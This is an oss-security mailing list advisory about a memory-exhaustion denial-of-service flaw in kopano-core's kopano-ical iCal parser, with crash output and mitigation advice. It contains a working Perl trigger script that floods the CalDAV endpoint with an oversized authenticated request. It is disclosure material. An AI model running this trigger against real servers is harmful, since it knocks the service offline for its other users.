X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2359" "Friday" "13" "August" "2021" "14:21:03" "+0200" "Jan Engelhardt" "jengelh@inai.de" nil "65" "[oss-security] kopano-core 11.0.2.43: Remote authenticated DoS with unhandled exception" nil nil nil "8" nil nil (number mark "U       jengelh@inai Aug 13   65/2359  " thread-indent "\"[oss-security] kopano-core 11.0.2.43: Remote authenticated DoS with unhandled exception\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] kopano-core 11.0.2.43: Remote authenticated DoS with unhandled exception" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 25955 invoked by uid 550); 14 Aug 2021 08:32:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11662 invoked from network); 13 Aug 2021 12:21:14 -0000
Date: Fri, 13 Aug 2021 14:21:03 +0200 (CEST)
From: Jan Engelhardt <jengelh@inai.de>
To: oss-security@lists.openwall.com
Message-ID: <667r8r55-1p9r-9n56-p26s-31q32674814@vanv.qr>
User-Agent: Alpine 2.24 (LSU 510 2020-10-10)
MIME-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Subject: [oss-security] kopano-core 11.0.2.43: Remote authenticated DoS with unhandled
 exception


To the best of my knowledge, this is the initial publication,
and there is no CVE number as of this time.


== Affected versions ==

  * kopano-core 11.0.2.43 and presumably all prior versions


== Issue ==

The ical parser in kopano-ical's "iCal::HrHandleIcalPost" function is
very memory hungry. With the testcase below, I observe that the
function makes the process image grow to as much memory as 30x the
size of the HTTP request it is processing. A suitably-chosen input
can be used to push the process over the limits of the environment.
An authenticated user is required to perform the operation, however.

If those conditions are met, std::bad_alloc can escape and, since this 
exception is unhandled, terminates the program, depriving other users of 
the service.

# ulimit -v 4000000
# ./kopano-ical -F &
01:04:40.029434: kopano-ical 11.0.1
01:04:40.029481: OS: openSUSE Tumbleweed (Linux 5.13.7 x86_64)
01:04:40.029488: Thread name: kopano-ical
01:04:40.029510: Peak RSS: 3911832
01:04:40.029528: Pid 14984 caught SIGSEGV (11), traceback:
01:04:40.029535: Backtrace:
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc
01:04:40.030456: ----------------------------------------------------------------------
01:04:40.030464: Fatal error detected. Please report all following information.
01:04:40.030471: kopano-ical 11.0.1
01:04:40.030477: OS: openSUSE Tumbleweed (Linux 5.13.7 x86_64)
01:04:40.030482: Thread name: kopano-ical
01:04:40.030489: Peak RSS: 3911832
01:04:40.030494: Pid 14984 caught SIGABRT (6), out of memory or unhandled exception, traceback:
01:04:40.030499: Backtrace:
terminate called recursively
Aborted (core dumped)


== Trigger ==

#!/usr/bin/perl
use IO::Socket::INET;
$s=IO::Socket::INET->new(PeerHost,"localhost",PeerPort,8000);
$rep = $ARGV[0] || 500; # max 19522
$size = $rep *11*10000+28;
$s->write("POST /caldav/ HTTP/1.0\nAuthorization: Basic Zm9vOmZvbw==\nContent-Length: $size\n\n");
$s->write("BEGIN:VCALENDER\nVERSION:2.0\n");
$a = "SUMMARY: A\n" x 10000;
$s->write($a) for 1..$rep;


== Mitigation ==

An administrator could install an additional proxy/loadbalancer/etc.
and there set a limit on the HTTP request size. (kopano-ical has
nothing of its own.) However, such administrative action equally
implies a reduction of the service's capabilities offered to
end-users.
